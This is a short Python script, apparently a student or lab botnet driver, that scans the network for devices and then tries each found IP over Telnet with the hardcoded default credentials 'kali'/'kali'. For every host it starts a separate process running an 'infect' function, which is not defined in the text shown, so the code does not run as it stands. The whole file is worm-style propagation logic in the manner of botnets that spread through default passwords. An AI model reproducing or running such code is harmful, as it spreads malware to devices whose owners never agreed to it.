from scan_device import Scanbot
from telnetBot import Telnet
import sys
import re
import os
import socket
import time
from multiprocessing import Process
 
listip = Scanbot.scan()

Scanbot.display_result(listip)

for ip in listip:
    ip = ip
    username = "kali"
    password = "kali"
    Telnet.telnet(ip)
    session = Process(target=infect, args=(
        ip.rstrip("\n"), username.rstrip("\n"), password.rstrip("\n")))
    session.start()
